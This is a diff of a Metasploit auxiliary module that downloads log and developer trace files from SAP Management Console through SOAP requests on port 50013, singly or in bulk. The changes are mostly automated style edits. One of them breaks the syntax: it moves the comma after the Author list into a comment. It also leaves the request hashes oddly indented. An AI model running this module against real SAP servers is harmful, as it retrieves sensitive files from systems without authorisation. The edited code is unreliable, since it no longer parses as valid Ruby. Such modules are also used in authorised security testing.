@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -14,12 +14,12 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name'         => 'SAP Management Console Get Logfile',
-      'Description'  => %q{
+      'Description'  => %q(
         This module simply attempts to download available logfiles and
         developer tracefiles through the SAP Management Console SOAP
         Interface. Please use the sap_mgmt_con_listlogfiles
         extension to view a list of available files.
-        },
+        ),
       'References'   =>
         [
           # General
@@ -27,40 +27,38 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'Author'       =>
         [	'Chris John Riley', # original msf module
-          'Bruno Morisson <bm[at]integrity.pt>' # bulk file retrieval
-        ],
+          'Bruno Morisson <bm[at]integrity.pt>'] # bulk file retrieval,
       'License'      => MSF_LICENSE
     )
-
 
     register_options(
       [
         Opt::RPORT(50013),
         OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),
         OptString.new('RFILE', [ true, 'The name of the file to download ', 'sapstart.log']),
-        OptEnum.new('FILETYPE', [true, 'Specify LOGFILE or TRACEFILE', 'TRACEFILE', ['TRACEFILE','LOGFILE']]),
+        OptEnum.new('FILETYPE', [true, 'Specify LOGFILE or TRACEFILE', 'TRACEFILE', ['TRACEFILE', 'LOGFILE']]),
         OptBool.new('GETALL', [ false, 'Download all available files (WARNING: may take a long time!)', false])
-      ], self.class)
+      ], self.class
+)
     register_autofilter_ports([ 50013 ])
     deregister_options('RHOST')
   end
 
   def run_host(ip)
     res = send_request_cgi({
-      'uri'      => normalize_uri(datastore['URI']),
+                             'uri'      => normalize_uri(datastore['URI']),
       'method'   => 'GET'
-    }, 25)
+                           }, 25)
 
-    if not res
+    unless res
       print_error("#{rhost}:#{rport} [SAP] Unable to connect")
       return
     end
     if datastore['GETALL']
       listfiles(ip)
     else
-      gettfiles(rhost,"#{datastore['RFILE']}",'')
+      gettfiles(rhost, (datastore['RFILE']).to_s, '')
     end
-
   end
 
   def listfiles(rhost)
@@ -95,19 +93,19 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       res = send_request_raw({
-        'uri'      => normalize_uri(datastore['URI']),
+                               'uri'      => normalize_uri(datastore['URI']),
         'method'   => 'POST',
         'data'     => data,
         'headers'  =>
           {
             'Content-Length' => data.length,
             'SOAPAction'     => '""',
-            'Content-Type'   => 'text/xml; charset=UTF-8',
+            'Content-Type'   => 'text/xml; charset=UTF-8'
           }
-      }, 30)
+                             }, 30)
 
       env = []
-      if res and res.code == 200
+      if res && (res.code == 200)
         case res.body
         when /<file>(.*)<\/file>/i
           body = []
@@ -115,10 +113,10 @@ class MetasploitModule < Msf::Auxiliary
           env = body.scan(/<filename>(.*?)<\/filename><size>(.*?)<\/size><modtime>(.*?)<\/modtime>/i)
           success = true
         end
-      elsif res and res.code == 500
+      elsif res && (res.code == 500)
         case res.body
         when /<faultstring>(.*)<\/faultstring>/i
-          faultcode = $1.strip
+          faultcode = Regexp.last_match(1).strip
           fault = true
         end
       end
@@ -132,7 +130,7 @@ class MetasploitModule < Msf::Auxiliary
       print_good("#{rhost}:#{rport} [SAP] #{datastore['FILETYPE'].downcase}: #{env.length} files available")
 
       env.each do |output|
-        gettfiles(rhost,output[0],output[1])
+        gettfiles(rhost, output[0], output[1])
       end
 
       return
@@ -147,7 +145,7 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def gettfiles(rhost,logfile,filelen)
+  def gettfiles(rhost, logfile, filelen)
     if filelen
       print_status("#{rhost}:#{rport} [SAP] Attempting to retrieve file #{logfile} (#{filelen} bytes)")
     else
@@ -184,20 +182,20 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       res = send_request_raw({
-        'uri'      => normalize_uri(datastore['URI']),
+                               'uri'      => normalize_uri(datastore['URI']),
         'method'   => 'POST',
         'data'     => data,
         'headers'  =>
           {
             'Content-Length' => data.length,
             'SOAPAction'     => '""',
-            'Content-Type'   => 'text/xml; charset=UTF-8',
+            'Content-Type'   => 'text/xml; charset=UTF-8'
           }
-      }, 120)
+                             }, 120)
 
       env = []
 
-      if res and res.code == 200
+      if res && (res.code == 200)
         case res.body
         when /<item>([^<]+)<\/item>/i
           body = []
@@ -208,14 +206,14 @@ class MetasploitModule < Msf::Auxiliary
 
         case res.body
         when /<name>([^<]+)<\/name>/i
-          name = $1.strip
+          name = Regexp.last_match(1).strip
           success = true
         end
 
-      elsif res and res.code == 500
+      elsif res && (res.code == 500)
         case res.body
         when /<faultstring>(.*)<\/faultstring>/i
-          faultcode = $1.strip
+          faultcode = Regexp.last_match(1).strip
           fault = true
         end
       end
